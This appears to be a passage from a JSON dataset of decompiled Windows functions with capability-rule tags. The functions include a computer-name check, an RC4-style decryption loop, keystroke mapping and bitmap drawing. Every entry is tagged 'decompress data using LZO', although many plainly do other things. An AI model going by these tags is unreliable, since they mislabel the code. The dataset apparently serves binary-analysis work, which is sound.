fcn.00404eb4();\n    }\n    fcn.00403ae4();\n    var_24h = fcn.00405dd8();\n    var_38h = *0x423334;\n    uStack56 = *0x423338;\n    uStack52 = *0x42333c;\n    uStack48 = *0x423340;\n    var_ch = &fcn.00423184::var_38h;\n    fcn.00406f3c();\n    var_4h = 0;\n    iVar1 = fcn.00405de8();\n    if (iVar1 < 1) {\n        uVar2 = 0x15;\n    }\n    else {\n        nSize = 0x10;\n        iVar1 = sub.kernel32.dll_GetComputerNameA(&fcn.00423184::lpBuffer, &fcn.00423184::nSize);\n        if (iVar1 == 0) {\n            bVar3 = false;\n        }\n        else {\n            fcn.004056dc();\n            fcn.004056f4();\n            fcn.004056f4(0);\n            uVar2 = fcn.004058fc();\n            fcn.004056dc(0, uVar2);\n            uVar2 = fcn.004058fc();\n            iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            bVar3 = iVar1 == 2;\n        }\n        if (bVar3) {\n            uVar2 = 0x15;\n        }\n        else {\n            uVar2 = 0x10;\n        }\n    }\n    uVar4 = var_10h;\n    (**0x4a1b64)(var_10h, 0, uVar2, &fcn.00423184::var_28h, 1, &fcn.00423184::var_ch);\n    fcn.00422fa8();\n    fcn.00422fa8();\n    fcn.00406f54();\n    *in_FS_OFFSET = uVar4;\n    fcn.00405490(0x42332c);\n    fcn.00405fd8();\n    return;\n}\n",
        "token_count": 805
    },
    "00423658": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423658(int32_t arg_8h, int16_t **arg_ch)\n\n{\n    int16_t **ppiVar1;\n    uchar *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t *in_EAX;\n    int16_t *piVar5;\n    int32_t iVar6;\n    char *in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t **in_FS_OFFSET;\n    uint uVar9;\n    int32_t *piStack1656;\n    uint uStack1652;\n    uchar *puStack1648;\n    int32_t *piStack1644;\n    uint uStack1640;\n    uchar *puStack1636;\n    uint32_t var_650h;\n    uint bstrString;\n    int32_t aiStack592 [127];\n    uint *var_50h;\n    uint *var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    int16_t **var_40h;\n    int16_t **var_3ch;\n    int16_t **var_38h;\n    int16_t **var_34h;\n    int32_t var_30h;\n    int16_t *var_2ch;\n    uint *var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    \n    puStack1648 = &stack0xfffffffc;\n    puStack1636 = 0x42367a;\n    var_24h = in_EAX;\n    fcn.00405f08();\n    uStack1640 = 0x423983;\n    piStack1644 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff994;\n    var_30h = 0;\n    uStack1652 = 0x423960;\n    piStack1656 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff988;\n    var_48h = in_EDX[1];\n    puVar2 = &stack0xfffffffc;\n    puStack1636 = &stack0xfffffffc;\n    if (0x40 < var_48h) {\n        puStack1636 = &stack0xfffffffc;\n        fcn.0040dab4();\n        fcn.00404eb4();\n        puVar2 = puStack1648;\n    }\n    puStack1648 = puVar2;\n    if (var_48h != 0) {\n        var_34h = arg_ch;\n        var_38h = &fcn.00423658::var_650h + var_48h * 4;\n        uVar7 = 0;\n        do {\n            ppiVar1 = var_34h;\n            var_38h = var_38h + -4;\n            var_2ch = in_EDX[uVar7 + 3] & 0x7f;\n            uVar3 = in_EDX[uVar7 + 3] & 0x80;\n            if (var_2ch == 0xa) {\n                *var_38h = 0xa;\n                var_38h[2] = 0x80020004;\n            }\n            else {\n                if (var_2ch == 0x48) {\n                    var_3ch = &fcn.00423658::bstrString + var_30h * 2;\n                    if (uVar3 == 0) {\n                        piVar5 = fcn.0040639c();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = NULL;\n                        *var_38h = 0x8;\n                        var_38h[2] = *var_3ch;\n                    }\n                    else {\n                        piVar5 = fcn.0040639c();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = *var_34h;\n                        *var_38h = 0x4008;\n                        var_38h[2] = var_3ch;\n                    }\n                    var_30h = var_30h + 1;\n                }\n                else if (uVar3 == 0) {\n                    if (var_2ch == 0xc) {\n                        if (*var_34h == 0x100) {\n                            var_40h = &fcn.00423658::bstrString + var_30h * 2;\n                            piVar5 = fcn.0040639c();\n                            *var_40h = piVar5;\n                            var_40h[1] = NULL;\n                            *var_38h = 0x8;\n                            var_38h[2] = *var_40h;\n                            var_30h = var_30h + 1;\n                        }\n                        else {\n                            *var_38h = *var_34h;\n                            var_38h[1] = ppiVar1[1];\n                            var_38h[2] = ppiVar1[2];\n                            var_38h[3] = ppiVar1[3];\n                            var_34h = var_34h + 3;\n                        }\n                    }\n                    else {\n                        *var_38h = var_2ch;\n                        var_38h[2] = *var_34h;\n                        if ((4 < var_2ch) && (var_2ch < 8)) {\n                            var_34h = var_34h + 1;\n                            var_38h[3] = *var_34h;\n                        }\n                    }\n                }\n                else {\n                    if ((var_2ch == 0xc) && (**var_34h == 0x100)) {\n                        fcn.00411b18();\n                    }\n                    *var_38h = var_2ch | 0x4000;\n                    var_38h[2] = *var_34h;\n                }\n                var_34h = var_34h + 1;\n            }\n            uVar7 = uVar7 + 1;\n        } while (var_48h != uVar7);\n    }\n    var_50h = &fcn.00423658::var_650h;\n    var_4ch = var_28h + 1;\n    var_44h = in_EDX[2];\n    uVar9 = *var_28h;\n    cVar4 = *in_EDX;\n    if (cVar4 == '\\x04') {\n        if ((var_650h & 0xfff) == 9) {\n            cVar4 = '\\b';\n        }\n        *var_28h = 0xfffffffd;\n        var_4ch = var_28h;\n        var_44h = var_44h + 1;\n    }\n    else if (((cVar4 == '\\x01') && (var_48h == 0)) && (arg_8h != 0)) {\n        cVar4 = '\\x03';\n    }\n    iVar6 = (**(*var_24h + 0x18))\n                      (var_24h, uVar9, *0x4a4df4, 0, cVar4, &fcn.00423658::var_50h, arg_8h, &fcn.00423658::var_20h, 0);\n    iVar8 = var_30h;\n    if (iVar6 != 0) {\n        fcn.00423c30();\n        iVar8 = var_30h;\n    }\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        if (*(&stack0xfffffdb0 + iVar8 * 8) != 0) {\n            fcn.00406378();\n        }\n    }\n    *in_FS_OFFSET = var_24h;\n    iVar8 = var_30h;\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        sub.oleaut32.dll_SysFreeString_1(uVar9, (&fcn.00423658::bstrString)[iVar8 * 2]);\n    }\n    return;\n}\n",
        "token_count": 1772
    },
    "00424c9c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00424c9c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char *in_EAX;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uchar *in_EDX;\n    int32_t *unaff_EBX;\n    int32_t *unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    uchar uVar5;\n    bool bVar6;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    int32_t *piStack32;\n    uint uStack28;\n    uchar *puStack24;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    iVar4 = 7;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    puStack24 = 0x424cba;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    uStack28 = 0x424e4f;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *in_EDX = 0;\n    var_20h = 0x424cd3;\n    puStack24 = &stack0xfffffffc;\n    fcn.00406f3c();\n    var_20h = &fcn.00424c9c::var_24h;\n    var_24h = 0x424cdf;\n    var_24h = fcn.00406f3c();\n    piVar1 = *(arg_8h + -4);\n    iVar4 = (**(*piVar1 + 0xc))(piVar1, 1);\n    if (iVar4 == 0) {\n        *(arg_8h + -8) = *(arg_8h + -8) + 1;\n        fcn.00406f3c();\n        uVar2 = fcn.00406f3c();\n        iVar4 = (**(*var_ch + 0x24))(var_ch, 0, 0, 0x424e60, uVar2);\n        if (iVar4 == 0) {\n            iVar4 = (**(*var_10h + 0xc))(var_10h, 0x424e70, &fcn.00424c9c::var_20h, 0);\n            uVar5 = iVar4 == 0;\n            if (uVar5) {\n                fcn.00414828();\n                fcn.00409a78();\n                fcn.004096d8();\n                fcn.00409a78(1);\n                fcn.004096d8();\n                fcn.00405894();\n                if (uVar5) {\n                    bVar6 = true;\n                }\n                else {\n                    pcVar3 = var_4h;\n                    if (var_4h != NULL) {\n                        pcVar3 = *(var_4h + -4);\n                    }\n                    if (pcVar3 == 0x2) {\n                        bVar6 = *var_4h == '#';\n                    }\n                    else {\n                        bVar6 = false;\n                    }\n                    if (bVar6) {\n                        bVar6 = var_4h[1] - 0x30 == *(arg_8h + -8);\n                    }\n                    else {\n                        bVar6 = false;\n                    }\n                }\n                if (bVar6) {\n                    fcn.00409a78();\n                    fcn.004054c0();\n                    uVar2 = fcn.00406f3c();\n                    iVar4 = (**(*var_ch + 0x20))(var_ch, 0, 0, *0x4a4b94, uVar2);\n                    *in_EDX = iVar4 == 0;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = piVar1;\n    var_24h = 0x424e56;\n    fcn.00405490();\n    fcn.00411434();\n    fcn.00406f3c();\n    fcn.00406f3c();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1095
    },
    "004288d8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004288d8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint Y;\n    int32_t X;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00428c3c();\n    cVar1 = fcn.004288ac();\n    X = in_EDX;\n    if (cVar1 == '\\x01') {\n        iVar2 = fcn.004289bc();\n        X = in_EDX + iVar2 + 1;\n    }\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar3 = fcn.004058fc(arg_8h, 0);\n    sub.gdi32.dll_ExtTextOutA(in_EAX[1], X, in_ECX, in_EAX[0x15], 0, uVar3);\n    fcn.004289bc();\n    fcn.00428844();\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 271
    },
    "00428974": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428974(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    fcn.00428c3c();\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004058fc(param_2, param_1);\n    sub.gdi32.dll_GetTextExtentPoint32A(*(in_EAX + 4), uVar1);\n    return;\n}\n",
        "token_count": 142
    },
    "004290d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004290d4(void)\n\n{\n    int16_t in_AX;\n    \n    if (((in_AX != 1) && (in_AX != 4)) && (in_AX != 8)) {\n        return 0;\n    }\n    return 1 << (in_AX & 0x1f);\n}\n",
        "token_count": 71
    },
    "0042d2a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.0042d2a0(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    \n    uVar4 = 8;\n    cVar3 = fcn.0042d220();\n    if (cVar3 == '\\x01') {\n        uVar4 = 0;\n    }\n    else {\n        iVar2 = *(in_EAX + 0x28);\n        uVar1 = *(iVar2 + 0x3e);\n        if (uVar1 < 0x11) {\n            if (uVar1 == 0x10) {\n                if (*(iVar2 + 0x40) == 0) {\n                    uVar4 = 4;\n                }\n                else if ((*(iVar2 + 0x40) == 3) && (*(iVar2 + 0x5c) == 0x7e0)) {\n                    uVar4 = 5;\n                }\n            }\n            else if (uVar1 == 1) {\n                uVar4 = 1;\n            }\n            else if (uVar1 == 4) {\n                uVar4 = 2;\n            }\n            else if (uVar1 == 8) {\n                uVar4 = 3;\n            }\n        }\n        else if (uVar1 == 0x18) {\n            uVar4 = 6;\n        }\n        else if ((uVar1 == 0x20) && (*(iVar2 + 0x40) == 0)) {\n            uVar4 = 7;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 365
    },
    "0042d7e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042d7e8(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uVar6;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uchar *puStack256;\n    uint uStack252;\n    int32_t *piStack248;\n    uint uStack244;\n    uint *puStack240;\n    uint uStack236;\n    uchar *puStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack212;\n    uint uStack208;\n    uchar *puStack204;\n    uint uStack200;\n    uint uStack196;\n    uchar *puStack192;\n    uint var_aah;\n    uint var_48h;\n    uint var_44h;\n    ushort var_40h;\n    ushort var_3eh;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint hpal;\n    uint hgdiobj;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint lpbmih;\n    int32_t lpbInit;\n    uint var_10h;\n    uint hdc;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack204 = &stack0xfffffffc;\n    puStack192 = 0x42d81b;\n    var_8h = in_EDX;\n    (**(*in_EDX + 0xc))();\n    bVar5 = var_20h == 0xc;\n    if (bVar5) {\n        var_20h = 0x28;\n    }\n    puStack192 = 0x42d840;\n    piVar1 = fcn.00402ef0();\n    uStack196 = 0x42dd09;\n    uStack200 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff38;\n    uStack208 = 0x42dcdc;\n    uStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    if (bVar5) {\n        puStack204 = &stack0xfffffffc;\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        fcn.00403ae4();\n        piVar1[1] = var_44h;\n        piVar1[2] = var_44h._2_2_;\n        *(piVar1 + 3) = var_40h;\n        *(piVar1 + 0xe) = var_3eh;\n    }\n    else {\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        if ((piVar1[4] != 3) && (piVar1[4] != 0)) {\n            var_8h = fcn.00404610();\n            if (arg_8h == 0) {\n                fcn.00403ae4();\n            }\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            uStack224 = 0x42d96e;\n            fcn.0041b728(in_ECX - var_20h, 0);\n            uStack224 = 0x42d97e;\n            (**(*var_8h + 0x14))();\n        }\n    }\n    *piVar1 = var_20h;\n    if (*(piVar1 + 3) != 1) {\n        fcn.00428e44();\n    }\n    if ((var_20h == 0x28) && (((*(piVar1 + 0xe) == 0x10 || (*(piVar1 + 0xe) == 0x20)) && (piVar1[4] == 3)))) {\n        fcn.0041b6b8();\n    }\n    if (piVar1[8] == 0) {\n        iVar2 = fcn.004290d4();\n        piVar1[8] = iVar2;\n    }\n    fcn.0041b6b8();\n    if ((piVar1[5] == 0) || (piVar1[4] == 0)) {\n        iVar2 = fcn.004290f4();\n        uVar4 = piVar1[2] >> 0x1f;\n        piVar1[5] = iVar2 * ((piVar1[2] ^ uVar4) - uVar4);\n    }\n    if (bVar5) {\n        fcn.004293a0();\n    }\n    sub.user32.dll_GetDC();\n    uStack252 = fcn.00428f64();\n    uStack224 = 0x42dc57;\n    uStack228 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff1c;\n    hdc = uStack252;\n    if (((piVar1[4] == 0) || (piVar1[4] == 3)) && (*0x4a1d14 == '\\0')) {\n        puStack232 = NULL;\n        uStack236 = 0;\n        puStack240 = &fcn.0042d7e8::lpbInit;\n        uStack244 = 0;\n        puStack256 = 0x42dbdd;\n        piStack248 = piVar1;\n        iVar2 = sub.gdi32.dll_CreateDIBSection();\n        if ((iVar2 == 0) || (lpbInit == 0)) {\n            puStack256 = 0x42dbf1;\n            iVar2 = sub.kernel32.dll_GetLastError_1();\n            if (iVar2 == 0) {\n                puStack256 = 0x42dbfa;\n                fcn.00428e44();\n            }\n            else {\n                puStack256 = 0x42dc01;\n                fcn.0040f168();\n            }\n        }\n        uStack260 = 0x42dc26;\n        uStack264 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffef8;\n        uStack268 = 0x42dc1c;\n        puStack256 = &stack0xfffffffc;\n        fcn.0041b6b8();\n        *in_FS_OFFSET = uStack264;\n        *in_FS_OFFSET = uStack252;\n        uStack244 = 0x42dc5e;\n        piStack248 = hdc;\n        uStack252 = 0;\n        puStack256 = 0x42dc56;\n        sub.user32.dll_ReleaseDC();\n        return;\n    }\n    var_10h = 0;\n    puStack232 = 0x42da99;\n    lpbInit = fcn.00402ef0();\n    uStack236 = 0x42dbbf;\n    puStack240 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff10;\n    uStack244 = 0x42dab7;\n    puStack232 = &stack0xfffffffc;\n    fcn.0041b6b8();\n    uStack244 = hdc;\n    piStack248 = 0x42dac0;\n    sub.gdi32.dll_CreateCompatibleDC();\n    piStack248 = 0x42dac5;\n    var_10h = fcn.00428f64();\n    piStack248 = 0x1;\n    uStack252 = 1;\n    puStack256 = hdc;\n    uStack260 = 0x42dad5;\n    uStack260 = sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack264 = var_10h;\n    uStack268 = 0x42dadf;\n    uVar3 = sub.gdi32.dll_SelectObject();\n    var_34h = 0;\n    if (piVar1[8] != 0) {\n        uStack268 = 0x42dafd;\n        uStack272 = fcn.0042965c();\n        uStack268 = 0;\n        uStack276 = var_10h;\n        uStack280 = 0x42db0f;\n        var_34h = sub.gdi32.dll_SelectPalette();\n        uStack280 = var_10h;\n        puStack284 = 0x42db1b;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack288 = 0x42db93;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    uVar6 = var_10h;\n    puStack284 = &stack0xfffffffc;\n    iVar2 = sub.gdi32.dll_CreateDIBitmap(var_10h, piVar1, 4, lpbInit, piVar1, 0);\n    if (iVar2 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0) {\n            fcn.00428e44();\n        }\n        else {\n            fcn.0040f168();\n        }\n    }\n    *in_FS_OFFSET = uVar6;\n    if (var_34h != 0) {\n        sub.gdi32.dll_SelectPalette(var_10h, var_34h, 0xffffffff, 0x42db9a);\n    }\n    uVar3 = sub.gdi32.dll_SelectObject(var_10h, uVar3);\n    sub.gdi32.dll_DeleteObject(uVar3);\n    return;\n}\n",
        "token_count": 2177
    },
    "00431508": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00431508(void)\n\n{\n    fcn.004058fc();\n    fcn.00431564();\n    fcn.004316e4();\n    return;\n}\n",
        "token_count": 40
    },
    "004459d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004459d4(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX & 0xff;\n    if (0x5a < uVar1) {\n        if (uVar1 < 0xa4) {\n            if (uVar1 == 0xa3) goto code_r0x00445a3f;\n            if (((uVar1 - 0x5b < 4) || (uVar1 == 0x60)) || (uVar1 - 0x7b < 4)) goto code_r0x00445a5e;\n        }\n        else if (((uVar1 == 0xa7) || (uVar1 == 0xb0)) || (uVar1 == 0xb5)) goto code_r0x00445a3f;\ncode_r0x00445a79:\n        sub.user32.dll_VkKeyScanA();\n        fcn.004459b4();\n        return;\n    }\n    if (uVar1 < 0x2e) {\n        if (uVar1 == 0x23) {\ncode_r0x00445a5e:\n            fcn.0044599c();\n            sub.user32.dll_VkKeyScanA();\n            fcn.004459b4();\n            fcn.0044599c();\n            return;\n        }\n        if ((uVar1 != 0x25) && (uVar1 != 0x2b)) goto code_r0x00445a79;\n    }\n    else if ((0xb < uVar1 - 0x2e) && (uVar1 != 0x3f)) {\n        if (uVar1 == 0x40) goto code_r0x00445a5e;\n        if (0x19 < uVar1 - 0x41) goto code_r0x00445a79;\n    }\ncode_r0x00445a3f:\n    fcn.00445980();\n    sub.user32.dll_VkKeyScanA();\n    fcn.004459b4();\n    fcn.00445980();\n    return;\n}\n",
        "token_count": 473
    },
    "0044c140": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0044c140(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x44c1b1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (0 < in_EAX) {\n        do {\n            fcn.00409d80();\n            fcn.00405738();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x44c1b8;\n    uStack32 = 0x44c1b0;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 240
    },
    "0044c1c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044c1c0(uint param_1, int32_t *param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x44c1d6;\n    fcn.004058ec();\n    uStack32 = 0x44c33e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uVar1 = in_EAX;\n    if (in_EAX != 0) {\n        uVar1 = *(in_EAX - 4);\n    }\n    uVar1 = uVar1 & 0x80000001;\n    if (uVar1 < 0) {\n        uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n    }\n    if (uVar1 == 0) {\n        puStack28 = &stack0xfffffffc;\n        fcn.00405b8c();\n        iVar4 = *param_2;\n        if (iVar4 != 0) {\n            iVar4 = *(iVar4 + -4);\n        }\n        if (0 < iVar4) {\n            iVar3 = 1;\n            do {\n                if (*((in_EAX - 2) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.0040595c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 2) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.0040595c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 2) + iVar3 * 2) + -0x37;\n                }\n                iVar2 = fcn.0040595c();\n                *(iVar2 + -1 + iVar3) = *(*param_2 + -1 + iVar3) << 4;\n                if (*((in_EAX - 1) + iVar3 * 2) - 0x30U < 10) {\n                    iVar2 = fcn.0040595c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x30;\n                }\n                else {\n                    if (5 < *((in_EAX - 1) + iVar3 * 2) + 0xbfU) break;\n                    iVar2 = fcn.0040595c();\n                    *(iVar2 + -1 + iVar3) = *((in_EAX - 1) + iVar3 * 2) + *(*param_2 + -1 + iVar3) + -0x37;\n                }\n                iVar3 = iVar3 + 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x44c345;\n    uStack32 = 0x44c33d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 782
    },
    "0044c34c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044c34c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    int32_t var_1ch;\n    uint8_t var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    puStack1076 = 0x44c377;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    puStack1076 = 0x44c37f;\n    fcn.004058ec();\n    uStack1080 = 0x44c619;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    iVar4 = var_8h;\n    if (var_8h != 0) {\n        iVar4 = *(var_8h + -4);\n    }\n    if (iVar4 != 0) {\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        if (iVar4 != 0) {\n            iVar4 = var_8h;\n            if (var_8h != 0) {\n                iVar4 = *(var_8h + -4);\n            }\n            if (iVar4 < 0x101) {\n                iVar4 = var_8h;\n                if (var_8h != 0) {\n                    iVar4 = *(var_8h + -4);\n                }\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406858(iVar4);\n                fcn.0040595c();\n                fcn.0044c138();\n            }\n            else {\n                puStack1076 = &stack0xfffffffc;\n                fcn.00406858(0x100);\n                fcn.0040595c();\n                fcn.0044c138();\n            }\n            iVar4 = 0;\n            piVar1 = &fcn.0044c34c::var_41ch;\n            do {\n                *piVar1 = iVar4;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            iVar4 = 0;\n            piVar1 = &fcn.0044c34c::var_41ch;\n            do {\n                iVar5 = var_8h;\n                if (var_8h != 0) {\n                    iVar5 = *(var_8h + -4);\n                }\n                uVar3 = *(var_ch + iVar4 % iVar5) + uVar3 + *piVar1 & 0x800000ff;\n                if (uVar3 < 0) {\n                    uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                }\n                var_15h = *piVar1;\n                *piVar1 = (&fcn.0044c34c::var_41ch)[uVar3];\n                (&fcn.0044c34c::var_41ch)[uVar3] = var_15h;\n                iVar4 = iVar4 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar4 != 0x100);\n            uVar3 = 0;\n            uVar6 = 0;\n            iVar4 = var_4h;\n            if (var_4h != 0) {\n                iVar4 = *(var_4h + -4);\n            }\n            fcn.00406858(iVar4);\n            fcn.0040595c();\n            fcn.0044c138();\n            if (var_4h != 0) {\n                var_4h = *(var_4h + -4);\n            }\n            if (-1 < var_4h + -1) {\n                var_1ch = var_4h;\n                iVar4 = 0;\n                do {\n                    uVar3 = uVar3 + 1 & 0x800000ff;\n                    if (uVar3 < 0) {\n                        uVar3 = (uVar3 - 1 | 0xffffff00) + 1;\n                    }\n                    uVar6 = uVar6 + (&fcn.0044c34c::var_41ch)[uVar3] & 0x800000ff;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xffffff00) + 1;\n                    }\n                    var_15h = *(&fcn.0044c34c::var_41ch + uVar3);\n                    (&fcn.0044c34c::var_41ch)[uVar3] = (&fcn.0044c34c::var_41ch)[uVar6];\n                    (&fcn.0044c34c::var_41ch)[uVar6] = var_15h;\n                    uVar2 = (&fcn.0044c34c::var_41ch)[uVar3] + (&fcn.0044c34c::var_41ch)[uVar6] & 0x800000ff;\n                    if (uVar2 < 0) {\n                        uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n                    }\n                    *(var_10h + iVar4) = *(var_10h + iVar4) ^ *(&fcn.0044c34c::var_41ch + uVar2);\n                    iVar4 = iVar4 + 1;\n                    var_1ch = var_1ch + -1;\n                } while (var_1ch != 0);\n            }\n            fcn.00405b8c();\n            fcn.0040595c();\n            fcn.0044c138();\n            fcn.0044c140();\n            fcn.004054c0();\n        }\n    }\n    *in_FS_OFFSET = uStack1084;\n    puStack1076 = 0x44c620;\n    uStack1080 = 0x44c5f8;\n    